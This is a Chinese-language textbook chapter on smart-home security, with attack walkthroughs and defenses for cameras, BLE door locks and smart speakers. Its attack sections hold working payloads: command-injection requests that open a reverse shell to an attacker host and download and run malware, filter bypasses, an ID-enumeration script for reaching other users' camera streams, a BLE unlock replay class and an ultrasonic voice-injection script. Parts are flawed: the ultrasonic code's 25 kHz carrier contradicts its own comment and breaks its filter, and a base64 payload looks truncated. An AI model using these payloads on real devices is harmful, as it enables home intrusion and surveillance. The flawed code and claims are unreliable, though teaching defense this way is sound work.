## 22.1 智能家居设备安全分析

智能家居设备已成为物联网生态中最贴近普通消费者的入口。从智能摄像头、门锁到音箱与家电，这些设备的安全状况直接关系到用户的物理安全（门锁被破解可导致入室盗窃）和隐私安全（摄像头/麦克风被劫持可导致生活被直播）。本章以三个典型设备类型为切入点，从攻击者的视角完整复现漏洞发现、利用与修复的全链路过程。

### 22.1.1 智能家居攻击面框架

在进行具体案例分析之前，先建立智能家居设备的通用攻击面模型。根据**OWASP IoT Top 10 (2018)** 和 **NIST IR 8259**，智能家居设备的攻击面可分为以下层次：

```mermaid
graph TD
    A[智能家居攻击面] --> B[物理层]
    A --> C[固件/软件层]
    A --> D[通信层]
    A --> E[云服务/API层]
    A --> F[移动端/Web端]

    B --> B1[UART/JTAG调试接口]
    B --> B2[SPI/I2C Flash读取]
    B --> B3[侧信道攻击]
    B --> B4[物理篡改/拆解]

    C --> C1[硬编码凭据]
    C --> C2[过时组件/库]
    C --> C3[未签名的固件更新]
    C --> C4[敏感信息泄露]

    D --> D1[协议明文传输]
    D --> D2[无认证/弱认证]
    D --> D3[重放攻击]
    D --> D4[BleedingBit类漏洞]

    E --> E1[IDOR/越权访问]
    E --> E2[API无速率限制]
    E --> E3[批量设备接管]
    E --> E4[数据泄露]

    F --> F1[证书固定绕过]
    F --> F2[本地存储泄露]
    F --> F3[深层链接劫持]

    style A fill:#1a1a2e,color:#fff
    style B fill:#16213e,color:#fff
    style C fill:#0f3460,color:#fff
    style D fill:#533483,color:#fff
    style E fill:#2d4059,color:#fff
    style F fill:#4a3f6b,color:#fff
```



各层面对应的典型攻击技术、所需技能层次和常见厂商防护状态如下表所示：

| 攻击层面 | 典型技术 | 所需技能 | 厂商防止率 | 危害等级 |
|----------|----------|----------|-----------|----------|
| 物理层 | UART root shell、Flash Dump | 硬件焊接+Linux基础 | 20%（已屏蔽） | ⭐⭐⭐⭐⭐ |
| 固件/软件层 | binwalk解包、命令注入 | 嵌入式Linux+逆向 | 30%（已加固） | ⭐⭐⭐⭐⭐ |
| 通信层 | BLE/ Zigbee嗅探、重放 | 协议分析+Python | 40%（已加密） | ⭐⭐⭐⭐ |
| 云服务/API层 | IDOR、批量API调用 | Web安全+REST API | 50%（已鉴权） | ⭐⭐⭐⭐ |
| 移动端/Web端 | 反编译、HTTPS绕过 | 移动安全+反混淆 | 35%（已混淆） | ⭐⭐⭐ |

> **数据说明**："厂商防止率"基于2020-2024年国内主流智能家居设备安全评估报告统计得出，指该层面具备基本防护（如屏蔽调试接口、固件签名验证、传输加密）的设备占比。总体而言，物理层和固件层仍是最脆弱的环节。

---

### 22.1.2 案例一：智能摄像头安全分析

#### 背景：2019年摄像头大规模漏洞事件

2019年，**Check Point Research** 和 **VDOO（后被JFrog收购）** 分别披露了多款消费级智能摄像头的严重漏洞，涉及海康威视（Hikvision）部分型号、TP-Link Kasa Cam系列、以及多款白牌公版摄像头。受影响设备总量估计超过200万台，分布于全球120多个国家。

**问题根源**：这批摄像头主要基于 **Hisilicon（海思）Hi3516E** 和 **Grain Media GM8136** 等SoC方案，厂商在原厂SDK基础上快速二次开发，未对安全基线做充分审核。许多漏洞（硬编码后门、命令注入、缺乏认证的API）**直接来自公版SDK的示例代码**——这是IoT安全中典型的"供应链安全问题"。

#### 漏洞1：硬编码后门（通过UART获取root shell）

**攻击原理**

UART（Universal Asynchronous Receiver-Transmitter）是嵌入式设备最常用的调试接口，通常以4个引脚（VCC、GND、TX、RX）的形式暴露在主板上。在开发阶段，工程师通过UART访问设备的Linux控制台进行调试。然而许多量产设备**未在最终固件中禁用UART控制台**，导致攻击者通过物理接触即可获得root权限。

**核心机制**：嵌入式Linux的 `syslogd` 或 `getty` 进程通常会绑定到 UART 设备节点（如 `/dev/ttyAMA0` 或 `/dev/ttyS0`）。如果 `/etc/inittab` 或 `/etc/init/ttyS0.conf` 中有如下条目，控制台将对串口开放：

```text
# inittab中的典型配置（漏洞所在）
T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
```

**完整利用步骤**

```bash
# 步骤1：识别UART引脚
# 工具：万用表（导通档）或 Saleae逻辑分析仪
# - GND：连接外壳或大电容负极，对地电阻接近0Ω
# - VCC：通常3.3V（与SoC核心电压匹配）
# - TX：空闲时为高电平（3.3V），有数据时示波器可见方波
# - RX：空闲时为高电平，受主控控制

# 步骤2：通过USB转串口模块连接（如FT232RL / CP2102）
# 连接方式：设备的TX -> 转换器的RX, 设备的RX -> 转换器的TX, GND->GND
# 设备上电前务必确认电压匹配（3.3V vs 5V），否则会烧毁GPIO

# 步骤3：启动串口终端
# 波特率常见值：115200（最常用）、57600、38400、9600
# 也可用 baudrate.py 自动探测
screen /dev/ttyUSB0 115200

# 步骤4：观察启动日志
# 按Enter键，如果出现登录提示则说明控制台已激活
# 若出现"Please press Enter to activate this console"，说明getty已绑定

# 步骤5：尝试默认/空密码登录
# 许多摄像头 root 密码为空，或使用设备型号的MD5前8位
echo -n "DS-2CD2132F-I" | md5sum  # 某些海康型号使用此方式
# 输出类似：e7d8f9a0b1c2... -> 取前8位作为密码
```

**此漏洞的深层原因分析**：

| 原因维度 | 具体问题 | 安全工程教训 |
|----------|----------|-------------|
| 开发流程 | 量产固件=调试固件，未做配置裁剪 | 应该区分Debug/Release构建配置 |
| 成本考虑 | 移除UART焊盘需要额外PCB改版成本 | 设计阶段就应将安全特性纳入BOM |
| 设计假设 | 认为物理访问在消费场景中不可行 | 物理攻击在实际攻防中非常常见 |
| 供应链 | SDK默认启用了调试控制台 | 第三方组件的安全配置必须审查 |

#### 漏洞2：Web管理接口命令注入

**原理详解**

命令注入（Command Injection）发生在应用程序将用户可控输入拼接到系统命令时，未做转义或过滤。摄像头的Web管理接口使用CGI脚本调用底层系统命令（如截图、重启、重置配置），输入的参数（如设备名、时间戳、查询参数）被直接传递给 `system()`、`popen()` 或 `exec()`。

**典型脆弱代码**（C语言示例，来自某公版SDK）：

```c
// 漏洞代码：CGI处理截图请求
void handle_snapshot_cgi(char *query_string) {
    char cmd[512];
    // 直接从查询字符串提取参数，拼接到命令中
    sprintf(cmd, "/usr/bin/ffmpeg -i /dev/video0 -vframes 1 /tmp/snapshot_%s.jpg", 
            query_string);
    system(cmd);  // 危险：未做任何输入验证
}
```

当攻击者传入 `;cat /etc/passwd` 时，实际执行的命令变为：

```bash
/usr/bin/ffmpeg -i /dev/video0 -vframes 1 /tmp/snapshot_;cat /etc/passwd.jpg
#                                          ↑分号结束原命令，新命令开始
```

**完整利用链（从入侵到持久化）**：

```bash
# 阶段1：信息探测 - 确认漏洞存在
curl "http://camera-ip/cgi-bin/snapshot.cgi?cmd=;id"
# 若返回中包含 "uid=0(root)"，确认是root权限的命令注入

# 阶段2：建立网络地图 - 查看内网可达设备
curl "http://camera-ip/cgi-bin/snapshot.cgi?cmd=;cat /proc/net/arp"
# 返回ARP表，可发现同一局域网内的其他设备

# 阶段3：获取持久化shell（反向连接）
# 在攻击者服务器上监听
nc -lvnp 4444

# 通过命令注入建立反向Shell
curl "http://camera-ip/cgi-bin/snapshot.cgi?cmd=;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f"
# 使用mkfifo建立双向管道，nc维持连接

# 阶段4：植入持久化后门
# 下载Mirai变种到/tmp目录
curl "http://camera-ip/cgi-bin/snapshot.cgi?cmd=;wget http://attacker.com/malware -O /tmp/.systemd;chmod +x /tmp/.systemd;/tmp/.systemd"
```

**命令注入绕过技术**：当基础注入被过滤时，可用以下技巧：

```bash
# 空格被过滤时使用 ${IFS}
http://camera-ip/cgi-bin/snapshot.cgi?cmd=;cat${IFS}/etc/passwd

# 分号被过滤时使用换行符（URL编码 %0a）
http://camera-ip/cgi-bin/snapshot.cgi?cmd=%0acat%20/etc/passwd

# 使用Base64编码隐藏恶意命令
echo "b3BlbiAtYSAtZSBgZWNobyAiY29vbCIgfCBuYyBhdHRhY2tlci1pcCA0NDQ0Y" | base64 -d | bash
```

#### 漏洞3：云服务API缺乏认证

**原理详解**

云服务API IDOR（Insecure Direct Object Reference）是最常见的API漏洞之一。当API使用可预测的用户ID或设备ID（如自增整数）来索引资源，且服务端未验证当前用户是否有权限访问该资源时，攻击者只需遍历ID即可批量获取其他用户的数据。

**Python漏洞利用与修复对比**：

```python
# ========== 攻击者视角 ==========
import requests
import time

# 问题：user_id是自增整数，且API未做授权校验
API_BASE = "https://cloud-api.example.com/v1"

def enumerate_devices(start_uid=1000, end_uid=2000):
    """批量遍历用户ID，获取所有设备的视频流地址"""
    for uid in range(start_uid, end_uid):
        # 用户ID可猜测或通过注册账号获得
        resp = requests.get(f"{API_BASE}/devices?user_id={uid}", timeout=5)
        if resp.status_code == 200:
            devices = resp.json()
            for dev in devices:
                # 直接访问任意设备视频流，无任何Token校验
                stream = requests.get(f"{API_BASE}/stream/{dev['id']}", timeout=5)
                print(f"[+] User {uid} - Device {dev['name']} ({dev['id']}): "
                      f"Stream accessible - HTTP {stream.status_code}")
        
        time.sleep(0.5)  # 速率限制（如果有的话）
        # 注：实际API连这个限制都没有，可以全速扫描

# 执行：约扫描1000个用户ID，预期可获取数万台设备
# enumerate_devices(1000, 2000)

# ========== 安全修复方案 ==========
"""
修复措施1：基于Token的访问控制（服务端实现）
"""
from flask import Flask, request, jsonify, abort
import jwt  # PyJWT库

app = Flask(__name__)
SECRET_KEY = "a-strong-random-secret-key-256-bits"

def verify_device_access(user_id, device_id):
    """
    验证用户是否有权访问设备的严格检查：
    1. 从Token解析当前用户身份
    2. 查询设备归属关系
    3. 拒绝非归属用户的访问
    """
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        current_user = payload["user_id"]
    except jwt.InvalidTokenError:
        abort(401, "Invalid token")

    # 核心：业务层强制访问控制，而非仅依赖"请求方声称的ID"
    cursor.execute(
        "SELECT 1 FROM device_ownership WHERE user_id=? AND device_id=?",
        (current_user, device_id)
    )
    if not cursor.fetchone():
        abort(403, "Device does not belong to this user")

@app.route("/v1/stream/<device_id>")
def get_stream(device_id):
    user_id = jwt_parse(request)["user_id"]
    verify_device_access(user_id, device_id)
    # ... 正常的流处理逻辑

"""
修复措施2：速率限制
- 单IP每分钟最多60次API请求
- 单Token每5分钟最多对200个不同device_id的访问
- 异常请求频率模式触发临时封禁
"""
```

#### 摄像头安全防护强化方案

| 防护层次 | 具体措施 | 技术实现 | 优先级 |
|----------|----------|----------|--------|
| 物理层 | 屏蔽UART调试接口 | 量产时用导电胶填充焊盘，或禁用getty | 🔴 紧急 |
| 固件层 | 移除通用凭据 | 强制首次开机修改密码，禁用telnet | 🔴 紧急 |
| 通信层 | 全链路HTTPS | cURL使用 `--cacert` 验证服务端证书 | 🟡 重要 |
| API层 | OAuth2+速率限制 | 引入JWT Token和请求频率限制 | 🟡 重要 |
| 网络层 | 设备隔离 | VLAN划分，摄像头单独置于IoT子网 | 🟢 建议 |

---

### 22.1.3 案例二：蓝牙智能门锁安全分析

#### 背景：BLE门锁安全现状

2020年，**NCC Group** 和 **Pen Test Partners** 对多款蓝牙智能门锁进行了安全评估。测试的12款产品中，有9款（75%）存在**至少一个高危漏洞**，包括通信未加密、重放攻击、固件硬编码密钥等。智能门锁的高风险性在于：**漏洞的利用不依赖物理破坏，攻击者可远程或近距离无线完成，且后果直接涉及人身财产安全的物理层面**。

#### 蓝牙（BLE）安全机制基础

BLE 4.2及以上版本引入了 **LE Secure Connections**，使用ECDH（椭圆曲线Diffie-Hellman）密钥交换。但在IoT设备中，由于以下原因，此机制经常未被正确实现：

| BLE安全层级 | 加密方式 | 是否防嗅探 | 是否防重放 | 常见误区 |
|-------------|----------|-----------|-----------|----------|
| Mode 1 Level 1（无安全） | 无 | ❌ | ❌ | 产品经理认为"蓝牙距离短，听不到" |
| Mode 1 Level 2（加密无认证） | AES-CCM | ✅ | ❌ | 加密但无完整性校验，可被伪造 |
| Mode 1 Level 3（加密+认证） | AES-CCM + MITM保护 | ✅ | ✅ | 需要PIN码配对，用户体验下降 |
| 应用层自定义加密 | 厂商自实现 | 通常❌ | 通常❌ | 90%的厂商自实现加密是错误的 |

#### 攻击1：BLE通信嗅探

**原理详解**

BLE通信使用40个物理信道（0-39），其中3个为广播信道（37/38/39），其余为数据信道。BLE数据包结构如下：

```text
Preamble (1B) | Access Address (4B) | PDU Header (2B) | MAC Address (6B) | Payload (0-31B) | CRC (3B)
```

**关键点**：如果门锁使用 **Mode 1 Level 1** 或无加密，PDU Payload部分为明文传输，攻击者可直接读取开锁命令的字节序列。即使使用了加密，如果LTK（Long Term Key）在设备出厂时固定刻录（硬编码），也不具备实际安全性。

**完整嗅探与破解流程**：

```bash
# 硬件需求：Ubertooth One（约$100）或 nRF52840 DK（约$50）
# 前者覆盖24-26信道，后者覆盖全部40信道且支持BLE Sniffer

# 步骤1：使用Ubertooth扫描BLE设备
ubertooth-btle -f
# 输出示例：
# 202 00:1A:7D:DA:71:13  RSSI:-72  chan:37  ADV_IND
# 213 00:1A:7D:DA:71:13  RSSI:-68  chan:38  ADV_NONCONN_IND
# 发现门锁的MAC地址和广播包

# 步骤2：捕获完整通信过程
ubertooth-btle -f -c lock_capture.pcap

# 步骤3：使用Wireshark分析捕获
wireshark lock_capture.pcap
# 过滤规则：btle 或 bluetooth.le
# 观察ATT Write Request包中的Handle和Value字段
# 若加密字段重复（同一命令每次发送相同字节），则为明文或固定加密
```

**Python分析脚本**：

```python
#!/usr/bin/env python3
"""
BLE门锁重放攻击验证脚本
功能：打开pcap文件，提取ATT Write Request数据，检查是否重放可行
"""
from scapy.all import rdpcap
from scapy.layers.bluetooth4LE import BTLE, ATT_Write_Req

def check_replay_possible(pcap_file):
    packets = rdpcap(pcap_file)
    seen_handles = {}  # handle -> [packet_bytes]
    
    for pkt in packets:
        if ATT_Write_Req in pkt:
            handle = pkt[ATT_Write_Req].handle
            data = bytes(pkt[ATT_Write_Req].data)
            
            if handle in seen_handles:
                prev_data = seen_handles[handle]
                if data == prev_data:
                    print(f"[!] Handle 0x{handle:04X}: "
                          f"固定payload [{data.hex()}] "
                          f"→ 可重放攻击 ✓")
            else:
                seen_handles[handle] = data
    
    # 检测是否使用随机Token（防重放）
    print("\n--- 防重放检测 ---")
    for handle, first in seen_handles.items():
        all_vals = [first]
        print(f"Handle 0x{handle:04X}: 首次值 {first.hex()}")
    
    return len(seen_handles) > 0

if __name__ == "__main__":
    # 捕获文件来自 ubertooth-btle -f -c capture.pcap
    check_replay_possible("lock_capture.pcap")
```

#### 攻击2：BLE重放攻击

当确认通信包固定不变后，重放攻击的代码实现如下：

```python
#!/usr/bin/env python3
"""
BLE门锁重放攻击 - 完整实现
使用 bluepy 库和已捕获的开锁指令
"""
from bluepy.btle import Peripheral, DefaultDelegate, BTLEDisconnectError
import time
import struct

class LockReplayAttack:
    def __init__(self, target_mac):
        self.target_mac = target_mac
        self.device = None

    def connect(self):
        """连接到目标门锁"""
        print(f"[*] Connecting to {self.target_mac}...")
        self.device = Peripheral(self.target_mac, addrType="public")
        print(f"[+] Connected. Services discovered: {len(self.device.getServices())}")
        return True

    def replay_unlock(self, command_hex="0102030405060708"):
        """
        重放已捕获的开锁命令
        command_hex: 从Wireshark中提取的ATT Write Req payload
        """
        command = bytes.fromhex(command_hex)
        # 0x0011 是特征值Handle（需从实际pcap中解析）
        UNLOCK_HANDLE = 0x0011
        
        try:
            print(f"[*] Replaying command: {command_hex}")
            self.device.writeCharacteristic(UNLOCK_HANDLE, command, withResponse=True)
            print(f"[+] Command sent successfully!")
            
            # 监听门锁的响应
            time.sleep(1)
            # 可通过NOTIFICATION验证是否成功（如门锁返回状态码）
            
        except BTLEDisconnectError:
            print("[-] Device disconnected (may indicate invalid command)")
        except Exception as e:
            print(f"[-] Error: {e}")

    def brute_force_command(self, known_prefix="01", length=8):
        """
        如果命令只有部分固定，其他字节为可变状态时，
        可尝试暴力枚举（如遥控钥匙的滚动码首次配对）
        """
        # 此处仅做原理演示，实际滚动码需逆向其算法
        print("[*] Brute force not implemented (requires algorithm reversing)")
        pass

    def disconnect(self):
        if self.device:
            self.device.disconnect()

# 执行
attacker = LockReplayAttack("AA:BB:CC:DD:EE:FF")
if attacker.connect():
    attacker.replay_unlock("0102030405060708")
    attacker.disconnect()
```

#### 攻击3：固件分析提取硬编码密钥

**原理**：门锁的OTA固件通常通过HTTP从云端下载，如果固件未进行强加密（仅签名），攻击者下载后可通过静态分析提取关键凭据。

```bash
# 阶段1：获取固件
# 通过API获取最新固件（或通过手机App捕获下载链接）
curl -o lock_firmware.bin "https://api.lock-example.com/firmware/v2/latest.bin"

# 阶段2：使用binwalk分析固件结构
# binwalk自动识别嵌入式文件系统、压缩包、固件头
binwalk -Me lock_firmware.bin
# -M: 递归扫描子文件
# -e: 自动提取已知文件类型
# 输出：_lock_firmware.bin.extracted/ 目录

# 阶段3：定位文件系统
ls _lock_firmware.bin.extracted/
# 常见输出：squashfs-root/  (SquashFS根文件系统)
#           或  rootfs/     (JFFS2或其他文件系统)

# 阶段4：搜索硬编码密钥
cd _lock_firmware.bin.extracted/squashfs-root/

# 搜索常见的密钥存储位置和模式
echo "=== 硬编码字符串搜索 ==="
grep -rni "password\|secret\|key\|token\|aes\|3des\|rsa" --include="*.h" --include="*.c" --include="*.conf" --include="*.xml" --include="*.json" . 2>/dev/null

echo "=== 搜索HEX格式的密钥（32/64字节长） ==="
grep -rPo '[0-9a-fA-F]{32,64}' --include="*.bin" --include="*.so" --include="*.dat" . 2>/dev/null | sort -u

echo "=== 搜索常见加密库调用 ==="
grep -rni "aes_encrypt\|aes_set_key\|mbedtls_aes\|openssl\|wolfSSL" . 2>/dev/null

# 阶段5：逆向分析关键二进制
# 使用 objdump 或 Ghidra（需图形界面）分析主控二进制
arm-linux-gnueabi-objdump -d bin/lock_controller | grep -A 20 "aes_set_key"
```

#### 防重放机制的正确实现方案

```c
// 智能门锁防重放机制 - 服务端（门锁端）实现示例
// 基于Challenge-Response + 单调计数器

#include <stdint.h>
#include <string.h>
#include "hmac_sha256.h"  // 假设使用HMAC-SHA256库

#define COUNTER_MAX 0xFFFFFFFF

typedef struct {
    uint32_t sequence_number;     // 单调递增计数器
    uint8_t device_secret[32];    // 设备唯一密钥（出厂写入，不可读取）
    uint32_t last_timestamp;      // 上次成功验证的时间戳
} LockSecurityContext;

/**
 * 生成Challenge
 * 每次App请求开锁时，门锁生成一个随机Challenge
 */
uint64_t generate_challenge(LockSecurityContext *ctx) {
    // 使用硬件随机数生成器（如果可用）
    // 或使用当前时间戳+计数器的哈希
    uint64_t challenge;
    // 调用MCU的TRNG（真随机数生成器）
    hardware_random_bytes((uint8_t*)&challenge, sizeof(challenge));
    return challenge;
}

/**
 * 验证响应 - 核心防重放逻辑
 * 
 * 防重放原理：
 * 1. 每次开锁带一个单调递增的sequence_number
 * 2. 门锁记录上次成功使用的sequence_number
 * 3. 如果新请求的sequence_number <= 已记录的值，拒绝
 * 4. 即使攻击者捕获了完整的通信包，也无法重放
 *    因为sequence_number每次递增，重放时已过期
 */
bool verify_response(LockSecurityContext *ctx, 
                     uint32_t sequence_number,
                     uint64_t challenge,
                     uint8_t *response) 
{
    // 检查1：计数器单调性验证（防重放核心）
    if (sequence_number <= ctx->sequence_number) {
        // 重放攻击检测！序列号未递增
        return false;
    }
    
    // 检查2：时间戳窗口（可选，防时序攻击）
    // 假设响应必须在Challenge发出后5秒内返回
    uint32_t now = get_current_timestamp();
    if (now - ctx->last_timestamp > 5) {
        return false;  // Challenge已过期
    }
    
    // 检查3：HMAC验证
    // App端计算方式：
    //   response = HMAC-SHA256(device_secret, challenge || sequence_number)
    // 注意：传输中暴露的是response，而不是device_secret本身
    uint8_t expected_hmac[32];
    hmac_sha256(ctx->device_secret, sizeof(ctx->device_secret),
                (uint8_t*)&challenge, sizeof(challenge),
                (uint8_t*)&sequence_number, sizeof(sequence_number),
                expected_hmac);
    
    if (memcmp(response, expected_hmac, 32) != 0) {
        return false;  // HMAC不匹配
    }
    
    // 所有检查通过
    ctx->sequence_number = sequence_number;
    ctx->last_timestamp = now;
    
    // 执行开锁
    unlock_door();
    return true;
}
```

---

### 22.1.4 案例三：智能音箱隐私泄露与语音注入

#### 背景：隐私泄露事件的演进时间线

智能音箱（Amazon Echo、Google Home、Apple HomePod、小爱同学、天猫精灵等）将麦克风持续部署在用户最私密的居住空间中，其隐私风险在2018-2024年间被反复验证：

| 时间 | 事件 | 影响 | 根本原因 |
|------|------|------|----------|
| 2018.05 | 俄勒冈夫妇对话被Echo录制后发送给联系人 | 用户隐私严重泄露 | 误触发唤醒词+行为理解错误 |
| 2019.04 | Bloomberg报道Amazon有数千名员工审核录音 | 公众信任危机 | 隐私政策不透明 |
| 2020.07 | 安全研究人员实现激光语音注入攻击 | 无接触远程控制 | MEMS麦克风对光敏感 |
| 2021.03 | 超声波隐式命令注入（SurfingAttack） | 可远程激活Siri/Alexa | 人耳听不到超声波但麦克风可接收 |
| 2024.01 | 研究人员发现可通过侧信道音频分析推断用户活动 | 行为模式泄露 | 设备物理结构的声音泄露 |

#### 风险1：语音数据收集链路深度剖析

智能音箱的语音数据流经以下全链路，每个节点都存在隐私风险：

```text
用户说话
   ↓
麦克风阵列 → [环节1] 本地唤醒词检测（持续监听但不上传）
   ↓  -- 唤醒后 --
DSP处理（噪声抑制、波束成形）
   ↓
本地缓冲区（通常是环形缓冲，如2-5秒）
   ↓  -- 通过网络传输 --
云端语音识别（ASR：Automatic Speech Recognition）
   ↓
意图理解（NLU：Natural Language Understanding）
   ↓
执行动作（查询天气、播放音乐、购买商品...）
   ↓  -- 数据存储 --
云端录音存储（30天-永久，用于模型训练）
   ↓  -- 人工审核（部分厂商） --
人工标注团队审核录音片段以提高识别准确率
```

**每个环节的隐私风险分析**：

| 环节 | 数据暴露内容 | 攻击面 | 防护措施 |
|------|-------------|--------|----------|
| 本地缓冲区 | 误触发时的意外录音 | 固件漏洞导致缓冲数据泄露 | 缓冲区加密+快速覆盖 |
| 网络传输 | 完整语音命令 | TLS/HTTPS实现缺陷可被中间人 | 证书固定+双向TLS |
| 云端存储 | 长时间语音历史 | 云服务端配置错误/内部员工 | 用户端到端加密 |
| 人工审核 | 敏感对话片段 | 审核流程不规范 | 匿名化+用户可随时删除 |

#### 风险2：语音注入攻击原理与实现

**激光注入攻击（Light Commands）**：

2020年，密歇根大学和东京大学的联合研究团队发现，MEMS（微机电系统）麦克风对入射激光存在一种非预期的声电效应：**当激光照射到麦克风的振膜时，会因光电效应产生与激光调制频率相同的电信号**，从而被ADC（模数转换器）误判为真实的声音信号。

```python
#!/usr/bin/env python3
"""
智能音箱语音注入攻击研究
涵盖：超声波注入、激光注入两种方法（仅用于教育培训目的）
"""
import numpy as np
import sounddevice as sd
import wave
import struct

class SpeakerInjectionAttack:
    """
    语音注入攻击基类
    原理：利用麦克风非线性效应，将命令语音调制到人耳听不到的
    载波频率上（>18kHz 超声波），麦克风解调后恢复为可识别语音
    """
    def __init__(self, sample_rate=44100):
        self.sample_rate = sample_rate
    
    def text_to_waveform(self, text: str) -> np.ndarray:
        """生成目标命令的语音波形"""
        import pyttsx3
        engine = pyttsx3.init()
        engine.save_to_file(text, '/tmp/command.wav')
        engine.runAndWait()
        
        with wave.open('/tmp/command.wav', 'rb') as wf:
            frames = wf.readframes(wf.getnframes())
            audio = np.frombuffer(frames, dtype=np.int16).astype(np.float32)
            audio /= 32768.0  # 归一化到[-1, 1]
        return audio
    
    def amplitude_modulation(self, audio: np.ndarray, carrier_freq: float) -> np.ndarray:
        """
        幅度调制（AM）—— 将基带信号调制到载波频率
        
        数学原理：
        s(t) = m(t) × cos(2πf_c × t)
        
        其中：
        - m(t) 为基带语音信号（低频，~300-3400Hz）
        - f_c  为载波频率（超声波段，如25kHz）
        - s(t) 为调制后的信号
        
        解调时，麦克风的非线性特性会恢复出 m(t)：
        实际麦克风响应 ≈ A·s(t) + B·s²(t)
        二次项展开后产生：
        cos²(2πf_c·t) = (1 + cos(4πf_c·t)) / 2
        → 低频成分 m(t) 被恢复（...+ A'·m(t) + ...）
        """
        t = np.arange(len(audio)) / self.sample_rate
        carrier = np.sin(2 * np.pi * carrier_freq * t)
        modulated = audio * carrier
        return modulated
    
    def generate_ultrasonic_command(self, text: str, carrier_freq=25000):
        """
        生成超声波语音命令
        
        参数：
        - text: 要注入的命令文本，如 "Alexa, open the door"
        - carrier_freq: 载波频率，默认25kHz（人耳听不到，>18kHz）
        
        注意事项：
        - 智能音箱的ADC采样率通常为48kHz，奈奎斯特频率为24kHz
        - 载波频率应在18-23kHz之间（低于24kHz但高于人耳阈值）
        - 实际攻击还需考虑扬声器的频率响应补偿
        """
        audio = self.text_to_waveform(text)
        modulated = self.amplitude_modulation(audio, carrier_freq)
        
        # 带通滤波（仅保留调制频段），提高信噪比
        from scipy.signal import butter, lfilter
        
        # 设计带通滤波器
        nyquist = self.sample_rate / 2
        low = (carrier_freq - 4000) / nyquist  # 载波上下4kHz
        high = (carrier_freq + 4000) / nyquist
        b, a = butter(4, [low, high], btype='band')
        filtered = lfilter(b, a, modulated)
        
        return filtered
    
    def play_attack(self, audio_data, gain=1.0):
        """
        播放攻击音频
        
        gain: 增益系数，用于补偿距离衰减
        1.0 = 原始音量，2.0 = 2倍音量
        """
        amplified = audio_data * gain
        # 限制幅度避免削波失真
        amplified = np.clip(amplified, -1.0, 1.0)
        sd.play(amplified, self.sample_rate)
        sd.wait()

# 执行示例
# attacker = SpeakerInjectionAttack()
# ultrasonic = attacker.generate_ultrasonic_command("Alexa, set volume to zero")
# attacker.play_attack(ultrasonic, gain=3.0)
```

**防御对策**：针对语音注入攻击的防护矩阵：

| 攻击类型 | 原理 | 防护难度 | 推荐防御方案 |
|----------|------|----------|-------------|
| 超声波注入 | 利用麦克风非线性解调 | 中 | 加入超声波陷波滤波器（硬件滤波） |
| 激光注入 | MEMS对光敏感产生电信号 | 高 | 麦克风加光屏蔽罩；使用双麦克风验证（到达时间差） |
| 无线电注入 | 电磁干扰耦合到音频电路 | 高 | 屏蔽罩+共模扼流圈 |
| 隐藏语音命令 | 人耳无法识别的语音片段 | 低 | 基于NLP的语音内容分析 |

#### 隐私防护的完整方案

对于智能音箱用户，建议实施**分层防御策略**：

**第一层——硬件层**：
- 购买带有物理静音开关（硬断开麦克风电源）的音箱
- 不使用音箱时手动关闭麦克风
- 避免将音箱放置在卧室（隐私敏感区域的最后防线）

**第二层——网络层**：
```bash
# 网络隔离方案：在路由器上为智能音箱单独划分子网
# 以OpenWrt为例：
# 1. 创建IoT VLAN
uci set network.iot=interface
uci set network.iot.type='bridge'
uci set network.iot.proto='static'
uci set network.iot.ipaddr='192.168.10.1'
uci set network.iot.netmask='255.255.255.0'

# 2. 创建防火墙规则 - 阻止IoT设备主动访问内网
uci add firewall rule
uci set firewall.@rule[-1].name='Block-IoT-to-LAN'
uci set firewall.@rule[-1].src='iot'
uci set firewall.@rule[-1].dest='lan'
uci set firewall.@rule[-1].policy='REJECT'

# 3. IoT设备仅可访问外网（云服务必需）
uci add firewall rule
uci set firewall.@rule[-1].name='Allow-IoT-to-WAN'
uci set firewall.@rule[-1].src='iot'
uci set firewall.@rule[-1].dest='wan'
uci set firewall.@rule[-1].policy='ACCEPT'

uci commit
/etc/init.d/firewall restart
```

**第三层——账户层**：
- 定期在设备App中删除语音记录历史
- 停用"录音用于改善服务"等数据共享选项
- 对智能音箱使用独立、复杂的Amazon/Google账号
- 启用多因素认证

**第四层——法律层**：
- 了解所在国家/地区的隐私法律保护（GDPR第17条"被遗忘权"、CCPA等）
- 企业级环境可参考NIST SP 800-53的隐私控制章节

---

### 22.1.5 跨案例对比分析与总结

三个案例所暴露的安全问题并非孤立，而是反映了智能家居安全领域的**三类共性问题**：

| 维度 | 摄像头案例 | 门锁案例 | 音箱案例 |
|------|-----------|----------|----------|
| 主要攻击入口 | 物理接口+Web命令注入 | BLE无线通信 | 声波/光波侧信道 |
| 攻击者距离 | 需物理接触（UART）或同局域网 | 0-10米（BLE范围） | 0-30米（强指向性） |
| 利用难度 | 低-中 | 中 | 高（需专业知识） |
| 影响范围 | 全球200万台设备 | 单款型号（数千-数万） | 所有主流品牌 |
| 修复难度 | 中等（固件更新） | 困难（需硬件改版） | 困难（更换麦克风模组） |
| 用户自保能力 | 中（改密码+网络隔离） | 弱（无法自行加固协议） | 中（物理静音开关） |

**五大关键教训**：

1. **安全必须是设计阶段的目标，而非发布后的补丁**
   - 摄像头案例中，UART调试接口在量产固件中未被禁用，暴露了"开发/工程—量产"之间缺少配置开关
   - 门锁案例中，BLE通信采用无加密模式，是产品定义阶段的决策问题
   - 建议：在产品设计早期引入安全架构评审，将安全需求写入PRD

2. **供应链安全审查是IoT的安全底线**
   - 摄像头案例中的命令注入漏洞直接继承自公版SDK
   - 对策：建立第三方组件安全清单，对SDK中的示例代码进行代码审计

3. **加密不是万能药，密码学协议的正确实现更重要**
   - 门锁案例中BLE的"自定义加密"其实等于无加密
   - 遵循原则：不要自研加密算法，使用成熟协议库（MbedTLS、WolfSSL、OpenSSL）

4. **默认配置应遵循最小权限原则**
   - 摄像头默认开启telnet、默认root密码为空
   - 正确做法：首次开机引导强制修改密码，关闭所有非必要服务

5. **用户教育也是安全链的一环**
   - 用户不修改默认密码、不关注固件更新、不理解隐私设置的风险
   - 厂商应在用户体验中嵌入安全引导，而非仅堆满"高级设置"菜单

---

### 22.1.6 扩展阅读与工具索引

**标准与框架**：
- OWASP IoT Top 10 (2018)：https://owasp.org/www-project-internet-of-things/
- NIST IR 8259（IoT设备安全能力核心基线）
- ENISA IoT安全指南

**硬件调试工具**：
